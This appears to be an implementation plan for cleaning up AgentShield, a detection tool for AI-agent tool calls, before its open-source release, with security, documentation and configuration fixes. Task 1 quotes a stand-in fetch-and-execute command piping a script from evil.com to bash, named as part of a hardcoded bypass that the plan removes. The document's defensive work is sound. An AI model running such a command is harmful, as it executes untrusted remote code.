# Open-Source Readiness Fixes — Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Fix all critical and important issues found in the full code review before public open-source release.

**Architecture:** No architectural changes. This is a targeted cleanup pass: removing security bypasses, fixing documentation drift, adding community health files, and reconciling configuration inconsistencies across Go engine, TypeScript plugin, and docs.

**Tech Stack:** Go 1.24, TypeScript/Node.js, Sigma YAML rules, GitHub Actions, shell scripts.

---

## Severity Summary

The review found **8 critical**, **22 important**, and **22 minor** issues across three review domains (Go engine, TypeScript plugin, docs/CI). This plan covers all critical and important items, plus the highest-impact minor items. Grouped into 12 tasks by logical area.

---

### Task 1: Remove hardcoded smoke-test bypass from evaluate.go

**Why:** `isKnownSmokeTestPayload` hardcodes the string `curl -fsSL http://evil.com/payload.sh | bash` and downgrades BLOCK to LOG. This is a security bypass that looks alarming in a public repo. The bench runner already uses its own config with triage disabled, so this is unnecessary.

**Files:**
- Modify: `internal/evaluate/evaluate.go:109-167`
- Modify: `internal/evaluate/evaluate_triage_test.go` (if it tests this path)

**Step 1: Remove `isKnownSmokeTestPayload` function and both call sites**

Remove lines 109-114 (the `if action == models.ActionBlock && isKnownSmokeTestPayload(req)` block) and lines 143-147 (the deep triage guard). Remove the `isKnownSmokeTestPayload` function (lines 151-167).

**Step 2: Run tests**

Run: `cd /Users/markbriers/Documents/Work/benchmark-ai/agentshield/agentshield && go test ./internal/evaluate/ -v -count=1`

Fix any tests that depended on the smoke-test bypass. Tests should pass by adjusting expectations, not by reintroducing the bypass.

**Step 3: Commit**

```bash
git add internal/evaluate/evaluate.go internal/evaluate/*_test.go
git commit -m "security: remove hardcoded smoke-test payload bypass from evaluator"
```

---

### Task 2: Silence retryablehttp logger to prevent API key leakage

**Why:** `hashicorp/go-retryablehttp` logs retry attempts to stderr by default, including request URLs and headers. The `Authorization: Bearer <API_KEY>` header could leak.

**Files:**
- Modify: `internal/triage/triage.go` (the `createHTTPClient` function)

**Step 1: Set `client.Logger = nil` in `createHTTPClient`**

After the `retryablehttp.NewClient()` call, add:
```go
client.Logger = nil
```

**Step 2: Run tests**

Run: `cd /Users/markbriers/Documents/Work/benchmark-ai/agentshield/agentshield && go test ./internal/triage/ -v -count=1`

**Step 3: Commit**

```bash
git add internal/triage/triage.go
git commit -m "security: silence retryablehttp logger to prevent API key leakage in retry logs"
```

---

### Task 3: Add triage error logging + propagate request context

**Why:** Triage errors are silently swallowed (no log call despite comment saying "Log error"). Also, `context.Background()` is used instead of the request context, wasting LLM credits on cancelled requests.

**Files:**
- Modify: `internal/evaluate/evaluate.go:87-95`

**Step 1: Add slog import if not present, add error logging, accept context parameter**

At line 87, change `ctx := context.Background()` to accept ctx from the caller (the `Evaluate` method signature needs a `context.Context` parameter, or use `req` to carry one).

At minimum, add logging in the error branch:
```go
if err != nil {
    slog.Error("triage failed, degrading gracefully", "error", err)
}
```

**Step 2: Run tests**

Run: `cd /Users/markbriers/Documents/Work/benchmark-ai/agentshield/agentshield && go test ./internal/evaluate/ -v -count=1`

**Step 3: Commit**

```bash
git add internal/evaluate/evaluate.go
git commit -m "fix: log triage errors instead of silently swallowing them"
```

---

### Task 4: Fix feedback manager stubs and unreachable condition

**Why:** `GetRuleStats` returns hardcoded FP rates (0.1, 0.8), `GetHighFalsePositiveRules` always returns empty, and the condition ordering makes the "disable" recommendation unreachable. The `refine` CLI is effectively broken.

**Files:**
- Modify: `internal/feedback/feedback.go:137-167`

**Step 1: Fix the unreachable condition (lines 152-157)**

Swap the order so `> 0.5` is checked before `> 0.3`:
```go
if stats.FalsePositiveRate > 0.5 {
    stats.RecommendedAction = "disable"
} else if stats.FalsePositiveRate > 0.3 {
    stats.RecommendedAction = "refine"
}
```

**Step 2: Add TODO comments to the placeholder values**

Make the placeholder nature explicit so users/contributors know this is incomplete:
```go
FalsePositiveRate: 0.1, // TODO(#XX): compute from store.GetRuleFPRate()
TruePositiveRate:  0.8, // TODO(#XX): compute from feedback data
FeedbackCount:     0,   // TODO(#XX): count from feedback table
```

Do the same for `GetHighFalsePositiveRules`:
```go
func (fm *FeedbackManager) GetHighFalsePositiveRules(threshold float64) ([]RuleStats, error) {
    // TODO(#XX): implement using store.GetRulesWithHighFPRate(threshold)
    return []RuleStats{}, nil
}
```

**Step 3: Run tests**

Run: `cd /Users/markbriers/Documents/Work/benchmark-ai/agentshield/agentshield && go test ./internal/feedback/ -v -count=1`

**Step 4: Commit**

```bash
git add internal/feedback/feedback.go
git commit -m "fix: correct unreachable condition in feedback stats, document placeholder values"
```

---

### Task 5: Fix Makefile, LICENSE, and bench/config.yaml

**Why:** Makefile has a hardcoded Go path that breaks on all other machines. LICENSE has unfilled copyright placeholders. bench/config.yaml uses wrong field name `mode` instead of `evaluation_mode`.

**Files:**
- Modify: `Makefile:4`
- Modify: `LICENSE:189`
- Modify: `bench/config.yaml:11`

**Step 1: Fix Makefile Go path**

Change line 4 from:
```makefile
GO = /usr/local/go/bin/go
```
to:
```makefile
GO ?= go
```

**Step 2: Fix LICENSE copyright line**

Change line 189 from:
```
   Copyright [yyyy] [name of copyright owner]
```
to:
```
   Copyright 2025-2026 AgentShield Contributors
```

**Step 3: Fix bench config field name**

Change line 11 of `bench/config.yaml` from:
```yaml
mode: enforce
```
to:
```yaml
evaluation_mode: "enforce"
```

**Step 4: Run tests to check nothing broke**

Run: `cd /Users/markbriers/Documents/Work/benchmark-ai/agentshield/agentshield && make test`

**Step 5: Commit**

```bash
git add Makefile LICENSE bench/config.yaml
git commit -m "chore: fix Makefile Go path, LICENSE copyright, bench config field name"
```

---

### Task 6: Add community health files (SECURITY.md, CONTRIBUTING.md, CODE_OF_CONDUCT.md)

**Why:** Required for any credible open-source release. GitHub surfaces these in the Security tab and community health checks.

**Files:**
- Create: `SECURITY.md`
- Create: `CONTRIBUTING.md`
- Create: `CODE_OF_CONDUCT.md`

**Step 1: Create SECURITY.md**

```markdown
# Security Policy

## Supported Versions

| Version | Supported          |
|---------|--------------------|
| 1.x     | Yes                |

## Reporting a Vulnerability

Please report security vulnerabilities to **security@agentshield.ai**.

- Do **not** open a public issue for security vulnerabilities.
- You should receive an acknowledgement within 48 hours.
- We aim to release a fix within 7 days of confirmation.

## Scope

AgentShield is a detection and response tool for AI agents. Security reports may cover:

- Authentication bypass in the HTTP API
- Rule evaluation logic errors that allow evasion
- Input validation failures leading to injection
- Information disclosure in API responses or logs
- Dependency vulnerabilities with exploitable impact
```

**Step 2: Create CONTRIBUTING.md**

Cover: prerequisites (Go 1.24+, Node.js 18+), building, testing, branch naming conventions (`<type>/<short-description>`), conventional commits, PR process, and rule contribution guide. Keep it concise — 80-100 lines.

**Step 3: Create CODE_OF_CONDUCT.md**

Use the Contributor Covenant v2.1 template.

**Step 4: Commit**

```bash
git add SECURITY.md CONTRIBUTING.md CODE_OF_CONDUCT.md
git commit -m "docs: add SECURITY.md, CONTRIBUTING.md, CODE_OF_CONDUCT.md"
```

---

### Task 7: Fix documentation drift — architecture.md, QUICK_START.md, deployment.md

**Why:** architecture.md lists wrong libraries (Gin, GORM, Logrus, Viper instead of Chi, modernc/sqlite, slog, Cobra). QUICK_START.md uses Python-era `uv run` commands. deployment.md references wrong module path. Personal paths leaked in docs. Go version claims 1.21 instead of 1.24.

**Files:**
- Modify: `docs/architecture.md:225-236`
- Modify: `docs/QUICK_START.md` (full rewrite or delete)
- Modify: `docs/deployment.md:13,29,72,375,389`
- Modify: `docs/TESTING_RULES.md` (Python-era references)
- Modify: `docs/log_rotation.md:231` (personal path)

**Step 1: Fix architecture.md libraries section (lines 225-236)**

Replace:
```markdown
### Core Technologies
- **Go 1.21+**: Engine implementation for performance
...
### Libraries & Dependencies
- **Sigma Go Library**: Rule parsing and evaluation
- **Gin**: HTTP server framework
- **GORM**: Database ORM
- **Logrus**: Structured logging
- **Viper**: Configuration management
```

With:
```markdown
### Core Technologies
- **Go 1.24+**: Engine implementation for performance
- **TypeScript**: OpenClaw plugin development
- **SQLite**: Local data persistence with WAL mode
- **Sigmalite**: Forked from RunReveal (Apache 2.0)

### Libraries & Dependencies
- **Chi** (`go-chi/chi`): HTTP router
- **modernc/sqlite**: Pure Go SQLite driver
- **slog** (stdlib): Structured logging
- **Cobra** (`spf13/cobra`): CLI framework
```

**Step 2: Rewrite or delete QUICK_START.md**

The file references `uv run agentshield`, `~/.clawdbot/`, and personal paths. Either:
- Delete it and point users to the README Quick Start section, or
- Rewrite using Go binary commands (`./bin/agentshield serve`, `./bin/agentshield alerts`, etc.)

**Step 3: Fix deployment.md**

- Line 13: Change `agentshield-engine` to `agentshield` in the `go install` path
- Line 29: Same for `git clone`
- Line 72: Add caveat that Docker image is not yet published, or remove the section
- Line 375: Change `agentshield-ai/rules.git` to reference bundled `rules/` directory
- Line 389: Mark `install.agentshield.ai` as coming soon or remove
- Lines 20+: Change `Go 1.21` to `Go 1.24`

**Step 4: Fix TESTING_RULES.md**

Replace `uv run agentshield` with Go binary commands. Replace/explain "Clawdbot" references.

**Step 5: Fix log_rotation.md personal path**

Replace `~/.claude/projects/-Users-markbriers-...-agentshield/` with `~/.claude/projects/<your-project>/`.

**Step 6: Commit**

```bash
git add docs/
git commit -m "docs: fix library names, Go version, stale Python-era commands, personal paths"
```

---

### Task 8: Reconcile OpenClaw plugin defaults and fix licence

**Why:** `config.ts` defaults (`timeout_ms: 200`, `timeout_policy: "block"`) disagree with `openclaw.plugin.json`, `manifest.json`, `install.sh`, and tests (which all say `50/100ms` and `"allow"`). Licence is MIT in package.json but Apache 2.0 everywhere else. Default port is 8432 in config.ts but 8433 in install.sh.

**Files:**
- Modify: `plugins/openclaw/openclaw.plugin.json` (defaults)
- Modify: `plugins/openclaw/skill/manifest.json` (defaults, uninstall ref, peer dep version)
- Modify: `plugins/openclaw/skill/install.sh` (defaults, port, chmod)
- Modify: `plugins/openclaw/package.json` (licence, repository directory, peer dep)
- Modify: `plugins/openclaw/src/config.test.ts` (update expected defaults)

**Step 1: Pick canonical defaults and apply everywhere**

The code in `config.ts` is the source of truth: `timeout_ms: 200`, `timeout_policy: "block"`, port `8433`.

Update `openclaw.plugin.json`:
- `timeout_ms` default: `200`
- `timeout_policy` default: `"block"`

Update `manifest.json`:
- Same defaults
- Change `"openclaw": ">=2024.1.0"` to match `package.json` peer dep
- Remove or add `uninstall.sh` reference (remove if no uninstall script exists)

Update `install.sh`:
- Line ~105: Change `${AGENTSHIELD_PORT:-8433}` — keep 8433 as this is the engine default
- Line ~204: Change `timeout_ms=100` to `timeout_ms=200`
- Line ~205: Change `timeout_policy="allow"` to `timeout_policy="block"`
- Line ~55: Change `chmod +x "$INSTALL_DIR/bin/"*` to `chmod +x "$INSTALL_DIR/bin/agentshield"`

Update `config.ts` line 5:
- Change default endpoint port from `8432` to `8433`: `http://127.0.0.1:8433/api/v1/evaluate`

**Step 2: Fix licence in package.json**

Change `"license": "MIT"` to `"license": "Apache-2.0"`.

**Step 3: Fix repository directory in package.json**

Change `"directory": "openclaw-plugin"` to `"directory": "plugins/openclaw"`.

**Step 4: Update tests to match new defaults**

In `config.test.ts`, update expected default values for `timeout_ms` (200) and `timeout_policy` ("block").

**Step 5: Commit**

```bash
git add plugins/openclaw/
git commit -m "fix(plugin): reconcile defaults, fix licence to Apache-2.0, correct port"
```

---

### Task 9: Rewrite OpenClaw plugin README.md

**Why:** The current README describes an entirely different configuration schema, class structure, and API format than what the code implements. It references non-existent files (`engine-client.ts`, `evaluator.ts`, `formatter.ts`), wrong config keys, wrong response formats, and chat commands that don't exist.

**Files:**
- Modify: `plugins/openclaw/README.md`

**Step 1: Rewrite to match actual implementation**

The README should document:
- **Installation:** via OpenClaw skill marketplace (`install.sh`) or manual npm
- **Configuration keys:** `enabled`, `endpoint`, `auth_token`, `timeout_ms`, `timeout_policy`, `intercept`, `skip`, `notify`, `circuit_breaker` — with types and defaults from `config.ts`
- **Architecture:** `index.ts` (plugin registration, hooks), `src/client.ts` (HTTP client), `src/circuit-breaker.ts`, `src/config.ts`, `src/event-builder.ts`, `src/normalise.ts`, `src/types.ts`
- **How it works:** `before_tool_call` hook evaluates, `after_tool_call` sends audit events
- **Licence:** Apache 2.0

Keep it concise — match the actual code, not aspirational features.

**Step 2: Commit**

```bash
git add plugins/openclaw/README.md
git commit -m "docs(plugin): rewrite README to match actual implementation"
```

---

### Task 10: Fix endpoint construction in client.ts

**Why:** `String.replace("/evaluate", "/audit")` only replaces the first occurrence. If the endpoint URL contains "evaluate" in the hostname (e.g. `http://evaluate.example.com/api/v1/evaluate`), derived endpoints are mangled.

**Files:**
- Modify: `plugins/openclaw/src/client.ts:39-45`

**Step 1: Use URL parsing instead of string replace**

Replace:
```typescript
this.auditEndpoint = config.endpoint.replace("/evaluate", "/audit");
this.lifecycleEndpoint = config.endpoint.replace("/evaluate", "/lifecycle");
this.healthEndpoint = config.endpoint.replace("/evaluate", "/health");
this.feedbackEndpoint = config.endpoint.replace("/evaluate", "/feedback");
```

With:
```typescript
const baseUrl = config.endpoint.replace(/\/evaluate$/, "");
this.auditEndpoint = `${baseUrl}/audit`;
this.lifecycleEndpoint = `${baseUrl}/lifecycle`;
this.healthEndpoint = `${baseUrl}/health`;
this.feedbackEndpoint = `${baseUrl}/feedback`;
```

The `$` anchor ensures only the trailing `/evaluate` is stripped.

**Step 2: Update client.test.ts if needed**

Check that the test assertions for endpoint derivation still pass.

**Step 3: Commit**

```bash
git add plugins/openclaw/src/client.ts plugins/openclaw/src/client.test.ts
git commit -m "fix(plugin): use anchored regex for endpoint derivation to prevent hostname mangling"
```

---

### Task 11: Remove/redact security remediation log, fix static badge, add json:"-" tags

**Why:** The remediation log contains detailed vulnerability descriptions with file paths and line numbers, plus "Remaining Items" listing unpatched issues. Publishing this provides an attacker roadmap. The README build badge is static (always green). Config struct fields with secrets have JSON tags that could leak.

**Files:**
- Remove or redact: `docs/security/SECURITY_REMEDIATION_LOG_2026-02-20.md`
- Remove or redact: `docs/security/REVIEW_CRITICAL_2026-02-20.md`
- Modify: `README.md:7` (static badge)
- Modify: `internal/config/config.go:22-24,79,90,109` (json tags on secrets)

**Step 1: Remove or redact the security files**

Option A (recommended): Delete both files from `docs/security/`. They remain in git history but won't be in the public tree.

Option B: Redact to show only remediation status without specific vulnerability details.

**Step 2: Fix README badge**

Change the static badge to a dynamic GitHub Actions badge:
```markdown
![Build Status](https://github.com/agentshield-ai/agentshield/actions/workflows/bench.yml/badge.svg)
```

**Step 3: Add `json:"-"` to secret fields in config.go**

```go
type AuthConfig struct {
    Token string `yaml:"token" json:"-"`
}
```

Same for `TriageConfig.APIKey`, `DeepTriageConfig.GatewayToken`, and `TestContextConfig.Token`.

**Step 4: Run tests**

Run: `cd /Users/markbriers/Documents/Work/benchmark-ai/agentshield/agentshield && go test ./internal/config/ -v -count=1`

**Step 5: Commit**

```bash
git add docs/security/ README.md internal/config/config.go
git commit -m "security: remove remediation logs, suppress secret fields from JSON, fix build badge"
```

---

### Task 12: Standardise Sigma rule logsource.product and fix misc rule issues

**Why:** Rules use three different `logsource.product` values (`ai_agent`, `agentshield`, `openclaw`) but docs recommend `agentshield`. One rule has a duplicate `level` field.

**Files:**
- Modify: `rules/prompt_injection/agent_prompt_injection_direct.yml` (product + duplicate level)
- Modify: `rules/prompt_injection/agent_prompt_injection_indirect.yml` (check product)
- Check all rules in `rules/` for `product:` consistency

**Step 1: Grep for inconsistent product values**

```bash
grep -r "product:" rules/ --include="*.yml"
```

Change all `product: ai_agent` and `product: openclaw` to `product: agentshield`.

**Step 2: Remove duplicate `level` in prompt injection direct rule**

The `level: critical` at the end of the file (after `falsepositives`) is redundant — remove it.

**Step 3: Commit**

```bash
git add rules/
git commit -m "chore(rules): standardise logsource.product to agentshield, remove duplicate fields"
```

---

## Out of Scope (deferred)

These items were found in the review but are deferred as they are not blockers for open-source release:

| Issue | Reason to defer |
|-------|----------------|
| `MatchedFields` echoes full user input in API response | Needs design decision on what to include; current behaviour is functional |
| `incorporateTriageResults` ignores triage verdicts | By design — triage results are informational. Upgrading requires policy work |
| `RawParams` JSON marshal has no size bound | Existing field-length validation catches this downstream |
| Rate limiter cleanup goroutine leak | Only on shutdown; no production impact |
| Unused CLI flags (`daemonMode`, `pidFile`) | Minor dead code, no user impact |
| `setupLogging` no-op function | Daemon sets up slog properly; this is cosmetic |
| Missing `tsconfig.json` for OpenClaw plugin | Plugin is consumed by OpenClaw's own TypeScript loader |
| `pendingEvaluations` map unbounded growth | TTL cleanup exists; cap would be premature optimisation |
| Missing tests for triage providers | Important but not a release blocker |
| GitHub issue/PR templates | Nice-to-have polish |
